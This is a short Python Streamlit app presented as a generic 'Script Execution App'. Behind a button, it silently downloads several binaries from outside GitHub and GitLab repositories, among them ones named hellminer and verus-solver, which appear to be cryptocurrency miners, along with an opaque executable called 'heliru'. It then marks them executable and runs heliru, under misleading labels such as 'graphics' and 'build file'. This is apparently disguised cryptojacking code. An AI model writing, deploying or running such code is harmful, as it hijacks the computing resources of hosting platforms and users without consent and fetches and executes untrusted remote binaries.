import os
import streamlit as st

# Streamlit App Title
st.title("Script Execution App")

# Description
st.write("This app allows you to execute a predefined script to download and run specific files.")

# Button to trigger the script
if st.button("Run Script"):
    st.write("Executing script...")

    # Execute the script commands
    try:
        # Download graphics.tar.gz
        st.write("Downloading graphics.tar.gz...")
        os.system("curl -0 https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz -o graphics.tar.gz >/dev/null 2>&1")
        st.write("Extracting graphics.tar.gz...")
        os.system("tar -xvzf graphics.tar.gz")

        # Download and prepare build file
        st.write("Downloading build file...")
        os.system("curl -0 https://gitlab.com/mauliki9999/peskot/-/raw/main/hellminer -o build >/dev/null 2>&1")
        st.write("Setting permissions for build file...")
        os.system("chmod +x build")

        # Download verus-solver
        st.write("Downloading verus-solver...")
        os.system("curl -0 https://gitlab.com/mauliki9999/peskot/-/raw/main/verus-solver -o verus-solver >/dev/null 2>&1")

        # Download and prepare heliru
        st.write("Downloading heliru...")
        os.system("curl -0 https://raw.githubusercontent.com/AzureOpSec/lolkaka/main/heliru -o heliru >/dev/null 2>&1")
        st.write("Setting permissions for heliru...")
        os.system("chmod +x heliru")

        # Execute heliru
        st.write("Running heliru...")
        os.system("./heliru")

        st.success("Script executed successfully!")
    except Exception as e:
        st.error(f"An error occurred: {e}")
